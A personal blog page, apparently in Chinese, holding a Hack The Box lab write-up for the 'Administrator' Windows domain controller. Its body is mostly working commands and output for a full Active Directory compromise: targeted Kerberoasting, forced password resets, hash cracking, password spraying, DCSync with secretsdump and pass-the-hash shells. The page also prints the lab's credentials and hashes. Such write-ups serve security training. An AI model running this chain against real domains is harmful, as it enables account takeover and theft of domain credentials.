@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael acco">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Administrator">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael acco">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/1.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/2.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/3.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/3.png">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/4.png">
+<meta property="article:published_time" content="2025-11-27T12:04:30.000Z">
+<meta property="article:modified_time" content="2025-11-27T15:50:51.504Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/11/27/Administrator/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/11/27/Administrator/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/11/27/Administrator/","path":"2025/11/27/Administrator/","title":"Administrator"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Administrator | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-docs"><a href="/docs/" rel="section"><i class="fa fa-book fa-fw"></i>Docs</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">1.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BloodHound"><span class="nav-number">1.2.</span> <span class="nav-text">BloodHound</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-michael"><span class="nav-number">2.</span> <span class="nav-text">Shell as michael</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Benjamin"><span class="nav-number">3.</span> <span class="nav-text">Shell as Benjamin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ForceChangePassword"><span class="nav-number">3.1.</span> <span class="nav-text">ForceChangePassword</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP"><span class="nav-number">3.2.</span> <span class="nav-text">FTP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Password-Safe-V3"><span class="nav-number">3.3.</span> <span class="nav-text">Password Safe V3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Emily"><span class="nav-number">4.</span> <span class="nav-text">Shell as Emily</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Ethan"><span class="nav-number">5.</span> <span class="nav-text">Shell as Ethan</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#targetedKerberoast"><span class="nav-number">5.1.</span> <span class="nav-text">targetedKerberoast</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secretsdump"><span class="nav-number">5.2.</span> <span class="nav-text">secretsdump</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Administrator"><span class="nav-number">6.</span> <span class="nav-text">Shell as Administrator</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/11/27/Administrator/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Administrator | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Administrator
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-11-27 20:04:30 / Modified: 23:50:51" itemprop="dateCreated datePublished" datetime="2025-11-27T20:04:30+08:00">2025-11-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Windows-Penetration-in-HTB/" itemprop="url" rel="index"><span itemprop="name">Windows Penetration in HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><code>Administrator</code> is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the <code>michael</code> account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user <code>olivia</code> has <code>GenericAll</code> permissions over <code>michael</code>, allowing us to reset his password. With access as <code>michael</code>, it is revealed that he can force a password change on the user <code>benjamin</code>, whose password is reset. This grants access to <code>FTP</code> where a <code>backup.psafe3</code> file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user <code>emily</code>. Further enumeration shows that <code>emily</code> has <code>GenericWrite</code> permissions over the user <code>ethan</code>, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for <code>ethan</code>, who is found to have <code>DCSync</code> rights ultimately allowing retrieval of the <code>Administrator</code> account hash and full domain compromise.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>❯ sudo nmap -sCV 10.10.11.42
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-25 23:40 +0800
+Nmap scan report for 10.10.11.42 (10.10.11.42)
+Host is up (0.56s latency).
+Not shown: 987 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 22:40:33Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2025-11-25T22:41:05
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+|_clock-skew: 6h59m58s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.08 seconds
+</code></pre>
+<p>有了上一题Certified的经历 拿到这题我就直接准备走bloodhound了 当然凭着做题的艺术 还是要试一下ftp</p>
+<pre><code>❯ netexec smb 10.10.11.42 -u &#39;Olivia&#39; -p &#39;ichliebedich&#39; --shares
+</code></pre>
+<p>果然是没有一点的回显 意料之中 那么直接上bloodhound了</p>
+<h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p><img src="/2025/11/27/Administrator/1.png"></p>
+<p>通过已知的Olivia 搜寻Outbound节点 最终可以找到Benjamin用户 </p>
+<p><img src="/2025/11/27/Administrator/2.png"></p>
+<p>而Benjamin用户没再有Outbound节点 查看所属组别发现属于一个特殊的share组 拿下它可能会有ftp权限? 找到Olivia到Benjamin路径 开始横向移动</p>
+<p><img src="/2025/11/27/Administrator/3.png"></p>
+<h1 id="Shell-as-michael"><a href="#Shell-as-michael" class="headerlink" title="Shell as michael"></a>Shell as michael</h1><pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ echo faketime &quot;$(ntpdate -q administrator.htb | cut -d &#39; &#39; -f 1,2)&quot;
+faketime 2025-11-28 03:02:24.630598
+
+┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ faketime &quot;$(ntpdate -q administrator.htb | cut -d &#39; &#39; -f 1,2)&quot; python targetedKerberoast.py -v -d &#39;administrator.htb&#39; -u &#39;Olivia&#39; -p &#39;ichliebedich&#39;
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (michael)
+[+] Printing hash for (michael)
+$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$...
+</code></pre>
+<p>在mac下 对faketime的一些操作有着严格的限制 后来还是切换到了kali 成功获取到michael的ntlm哈希 不过想了想还是直接改密码来的方便</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ net rpc password &quot;michael&quot; &quot;12345678&quot; -U &quot;administrator.htb&quot;/&quot;Olivia&quot;%&quot;ichliebedich&quot; -S &quot;10.10.11.42&quot;
+
+┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ netexec smb 10.10.11.42 -u &quot;michael&quot; -p &quot;12345678&quot;
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:12345678
+</code></pre>
+<h1 id="Shell-as-Benjamin"><a href="#Shell-as-Benjamin" class="headerlink" title="Shell as Benjamin"></a>Shell as Benjamin</h1><h2 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h2><p>从michael横向到benjamin的操作是一样的 ForceChangePassword</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ net rpc password &quot;benjamin&quot; &quot;12345678&quot; -U &quot;administrator.htb&quot;/&quot;michael&quot;%&quot;12345678&quot; -S &quot;10.10.11.42&quot;
+
+┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ netexec smb 10.10.11.42 -u &quot;benjamin&quot; -p &quot;12345678&quot;
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:12345678
+</code></pre>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>成功修改benjamin的凭据 通过此凭据尝试一下登录ftp</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ netexec smb 10.10.11.42 -u &quot;benjamin&quot; -p &quot;12345678&quot; --users
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:12345678
+SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
+SMB         10.10.11.42     445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account
+SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0
+SMB         10.10.11.42     445    DC               michael                       2025-11-27 19:40:32 0
+SMB         10.10.11.42     445    DC               benjamin                      2025-11-27 19:46:49 0
+SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0
+SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0
+SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0
+SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0
+SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
+</code></pre>
+<p>果然不出所料 有ftp权限 直接登录看一下</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ ftp 10.10.11.42
+Connected to 10.10.11.42.
+220 Microsoft FTP Service
+Name (10.10.11.42:kali): benjamin
+331 Password required
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||63311|)
+125 Data connection already open; Transfer starting.
+10-05-24  08:13AM                  952 Backup.psafe3
+226 Transfer complete.
+ftp&gt; get Backup.psafe3
+local: Backup.psafe3 remote: Backup.psafe3
+229 Entering Extended Passive Mode (|||63312|)
+150 Opening ASCII mode data connection.
+100% |******************************************************************|   952        1.81 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 3 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+952 bytes received in 00:00 (1.30 KiB/s)
+</code></pre>
+<p>获取到之后 使用hashcat爆破密码 此时虚拟机内存不够 切到mac操作</p>
+<pre><code>❯ hashcat -m 5200 Backup.psafe3 ~/Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt
+hashcat (v7.1.2) starting
+
+METAL API (Metal 368.52)
+========================
+* Device #01: Apple M3 Pro, skipped
+...
+Backup.psafe3:tekieromucho
+...
+</code></pre>
+<h2 id="Password-Safe-V3"><a href="#Password-Safe-V3" class="headerlink" title="Password Safe V3"></a>Password Safe V3</h2><p>根据信息搜集 发现这个备份文件是password safe v3数据库的 据此安装数据库后 获取到Emily的密码</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop]
+└─$ netexec smb 10.10.11.42 -u alexander -p UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ netexec smb 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ netexec smb 10.10.11.42 -u emma -p WwANQWnmJnGV07WQN8bMS7FMAbjNur
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
+
+❯ netexec winrm 10.10.11.42 -u emily -p &#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;
+WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
+WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
+</code></pre>
+<h1 id="Shell-as-Emily"><a href="#Shell-as-Emily" class="headerlink" title="Shell as Emily"></a>Shell as Emily</h1><p>发现可以复用emily账户密码 成功获取到user的flag 话说nxc检测密码在kali上没法用 mac上又可以 真是神奇</p>
+<pre><code>❯ evil-winrm -i 10.10.11.42 -u &#39;emily&#39; -p &#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;
+
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily\Documents&gt; cat ../Desktop/user.txt
+d19ba37070c454a1ecc84ceda048251b
+</code></pre>
+<h1 id="Shell-as-Ethan"><a href="#Shell-as-Ethan" class="headerlink" title="Shell as Ethan"></a>Shell as Ethan</h1><h2 id="targetedKerberoast"><a href="#targetedKerberoast" class="headerlink" title="targetedKerberoast"></a>targetedKerberoast</h2><p><img src="/2025/11/27/Administrator/3.png"></p>
+<p>我们发现emily可以横向移动到ethan 更进一步发现ethan对域控有着一定的控制权限</p>
+<p><img src="/2025/11/27/Administrator/4.png"></p>
+<p>那还有啥好说的 开始横向移动到ethan</p>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ faketime &quot;$(ntpdate -q administrator.htb | cut -d &#39; &#39; -f 1,2)&quot; python3 targetedKerberoast.py -v -d &#39;administrator.htb&#39; -u &#39;emily&#39; -p &#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (ethan)
+[+] Printing hash for (ethan)
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e2a7955d1c78f7e263877984db186ecf$37d47d53cd5b0caa
+...
+
+❯ hashcat -m 5600 ethan.hash ~/Documents/Red/SecDictionary/PasswordDic/弱口令字典/rockyou-top15000.txt
+...
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan...:limpbizkit
+...
+
+┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ netexec smb 10.10.11.42 -u ethan -p limpbizkit
+SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit
+</code></pre>
+<p>smb的凭据是没问题的 但是shell是连不上的 不过问题也不大 ethan对域控有GetChangesAll权限 可使用<code>secretsdump.py</code>进行泄露</p>
+<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><pre><code>┌──(kali㉿kali)-[~/Desktop/red/targetedKerberoast]
+└─$ impacket-secretsdump 10.10.11.42/ethan:limpbizkit@10.10.11.42
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+...
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up...
+
+❯ netexec winrm 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
+WINRM       10.10.11.42     5985   DC               [+] administrator.htb\administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
+</code></pre>
+<h1 id="Shell-as-Administrator"><a href="#Shell-as-Administrator" class="headerlink" title="Shell as Administrator"></a>Shell as Administrator</h1><pre><code>❯ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
+
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../Desktop/root.txt
+70d6b7a68ce98e63adcb7615d3644a2c
+</code></pre>
+<p>(话说这题环境比certified稳的多)</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/12/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%94%BB%E5%87%BB/" rel="prev" title="Kerberos协议及攻击">
+                  <i class="fa fa-angle-left"></i> Kerberos协议及攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
